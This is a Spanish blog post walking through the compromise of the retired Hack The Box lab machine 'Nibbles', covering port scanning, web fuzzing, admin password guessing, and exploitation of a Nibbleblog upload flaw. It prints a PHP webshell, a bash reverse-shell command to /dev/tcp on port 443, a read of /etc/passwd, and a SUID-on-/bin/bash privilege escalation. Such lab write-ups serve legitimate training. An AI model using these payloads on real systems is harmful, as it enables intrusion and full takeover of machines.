---
title: "Nibbles"
layout: "post"
categories: [ "HTB - Retired Machines", "Easy" ]
tags: [ "sudo", "nmap", "ffuf", "curl", "wappalyzer" ]
---

## Info

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/01_nibbles.png)
*Nibbles - HTB (Easy)*

En este post, voy a compartir cómo resolví la máquina retirada **Nibbles** de Hack the Box, clasificada como *Easy*.

## Nmap

Comienzo verificando si el host está activo. Para ello, envio un paquete **ICMP** hacia la IP del objetivo.

```shell
ping -c 1 "IP_VICTIM"
```
Como respondió correctamente, realizamos un escaneo completo de puertos usando `nmap`:

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv "IP_VICTIM" -oG allPorts
```
Explicación de los parámetros.

- `-p-`: Escanea todo el rango de puertos del 1-65535.
- `--open`: Muestra solo los puertos abiertos.
- `-sS`: Realiza un escaneo TCP SYN (Stealth Scan).
- `--min-rate 5000`: Establece una velocidad mínima de 5000 paquetes por segundo.
- `-n`: No realizar resolución DNS.
- `-Pn`: Omite el descubrimiento de hosts.
- `-vvv`: Muestra información detallada durante el escaneo.
- `-oG`: Exporta el output en formato "grepable" en el archivo **allPorts**.

Una vez terminado el escaneo, utilicé la función [extractPorts](https://pastebin.com/xNaZxRGA) para extraer los puertos abiertos y copiarlos al portapapeles.

El escaneo revela dos puertos abiertos: **22 (SSH)** y **80 (HTTP)**. Para obtener más información, hago un escaneo de versiones y servicios de los puertos descubiertos:

```shell
nmap -sCV -p22,80 "IP_VICTIM" -oN version
```

- `-sC`: Realiza un escaneo usando un conjunto de scripts por defecto que incluyen: discovery, intrusive, etc.
- `-sV`: Habilita la detección de versión y servicio para cada uno de estos puertos. 
- `-p`: Escanear solo los puertos específicados.
- `-oN`: Exportar el output en formato normal hacia el archivo **version**

Los resultados muestran que el sistema corre **Apache** y **OpenSSH**. Usando la versión de `OpenSSH`, identifico que el sistema probablemente se basa en **Ubuntu Xenial (16.04)**.

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/02_nibbles.png)
*Launchpad*

## Enumeración Web

Accedo desde el navegador al puerto 80 del objetivo, donde me encuentro con una simple página de bienvenida. En seguida, revisó el código fuente, y se revela una ruta interesante:

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/04_nibbles.png)
*Source Code*

### Fingerprinting

Al visitar ese endpoint, soy redirigido a un CMS llamado **Nibbleblog**. Uso herramientas como `WhatWeb` y `Wappalyzer` para identificar las tecnologías del sitio.

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/05_nibbles.png)
*Wappalyzer*

Ambas confirman el uso de:

- `PHP`
- `Apache`
- `jQuery`
- `CMS`: [Nibbleblog](https://code.google.com/archive/p/nibbleblog/)

Dado que el lenguaje de programación del backend es `PHP`, empiezo a pensar en posibles vectores de **RCE** a través de la carga de archivos.

### ffuf 

A continuación, realizo fuzzing con `ffuf` (puedes usar `dirsearch`, `gobuster` , `wfuzz`, etc) utilizando un diccionario de [SecLists](https://github.com/danielmiessler/SecLists).

```shell
ffuf -c -ic -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/common.txt -u http://IP_VICTIM/nibbleblog/FUZZ -mc all -fc 404
```
![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/06_nibbles.png)
*Output ffuf*

Encuentro algunos recursos interesantes:

- `/README`: Muestra la versión del CMS. 
- `/admin.php`: Panel de login.
- `/plugins`: Capacidad de directory listing habilitado.
- `/content/users.xml`: Encuentro un nombre de usuario válido. 

Intento ingresar al panel de login (`/admin.php`) usando el usuario encontrado y algunas [contraseñas comunes](https://venturebeat.com/security/the-top-20-admin-passwords-will-have-you-facepalming-hard). Sin embargo, tras varios intentos, desencadena un bloqueo temporal de mis solicitudes y el servidor devuelve un mensaje de protección:

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/07_nibbles.png)

Esto indica que **no vale la pena insistir la fuerza bruta**. Entonces, deduzco que podría ser una contraseña simple basada en el nombre del sitio, pruebo con posibles variantes como: `Nibbles`, `nibbles`, `NIBBLES`, y... ¡logro acceder como el usuario **admin**!

## Explotación 

Una vez dentro, verifico la versión exacta del CMS e investigo posibles vulnerabilidades conocidas usando estas palabras clave: `Nibbleblog 4.0.3 exploit`. Encuentro una que destaca: `CVE-2015-6967`, que permite la carga arbitraria de archivos si se tiene acceso autenticado.

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/03_nibbles.png)
*README*

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/08_nibbles.png)

Este [artículo](https://systemweakness.com/a-look-at-cve-2015-6967-fe9a990d57a1) explica bien cómo funciona la vulnerabilidad. En resumen, el ataque se acontece utilizando el plugin `My Image`, que permite subir **cualquier archivo independientemente de su extensión** dándome total libertad a cargar archivos PHP.

Creo una webshell simple en mi máquina y la almaceno como `shell.php`:

```php
<?php
    system($_GET['cmd']);
?>
```

Subo el archivo a través del plugin. Aunque se muestran varios errores, el mensaje indica que el archivo ha sido subido exitosamente.

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/09_nibbles.png)
*Plugin My Image - Upload shell.php*

Según el artículo, los archivos se almacenan en: `/content/private/plugins/my_image`. Accedo a esta ruta, y ejecuto comandos a través del parámetro `cmd` del archivo `image.php`:

```shell
http://IP_VICTIM/nibbleblog/content/private/plugins/my_image/image.php?cmd=cat /etc/passwd
```

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/10_nibbles.png)
*Reading /etc/passwd*

¡Confirmado! Tengo **RCE**. Para obtener una **reverse shell**, usaré el primer payload de [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```shell
http://IP_VICTIM/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash -c 'bash -i >%26 /dev/tcp/YOUR_IP/443 0>%261'
```
> Nota: Reemplazo `&` por `%26` usando URL encoding. 

Por otro lado en mi host, me pongo a la escucha con `nc`:

```shell
nc -lnvp 443
```

- `-l`: Escucha conexiones entrantes.
- `-n`: Omitir la resolución DNS.
- `-v`: Muestra información detallada.
- `-p`: Especifica el puerto en el que debe escuchar (443 en este caso).

Una vez que ejecuto el payload se ejecuta, tengo una shell.

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/11_nibbles.png)

## User shell

Antes de continuar, realizaré el tratamiento de la TTY para obtener una full TTY funcional.

```shell
script /dev/null -c bash
# [ Ctrl + Z ]

stty raw -echo; fg
reset xterm
export TERM=xterm
```

Y también ajusto la proporción de las filas y columnas:

```shell
# En mi máquina 
stty size

# En Nibbles
stty rows 45 columns 184
```

Encuentro la **user flag** en el directorio personal del usuario:

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/12_nibbles.png)

## Privilege Escalation

Verifico permisos `sudo`:

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/13_nibbles.png)

El resultado muestra que puedo ejecutar un script como `root`, sin proporcionar contraseña. Aunque el script aún no existe, tengo permisos de escritura, por lo que puedo crearlo.

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/14_nibbles.png)

El script contiene estas instrucciones:

```shell
#!/bin/bash

chmod 4755 /bin/bash
```

Ejecuto este script con `sudo`:

```shell
sudo -u root /home/nibbler/personal/stuff/monitor.sh
```

Esto le asigna el **bit SUID** a `/bin/bash`. Verifico los permisos, y abro una shell con privilegios elevados:

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/15_nibbles.png)

Finalmente, tengo acceso como root:

![Nibbles](/assets/posts/2025-09-06-nibbles-machines-htb/16_nibbles.png)
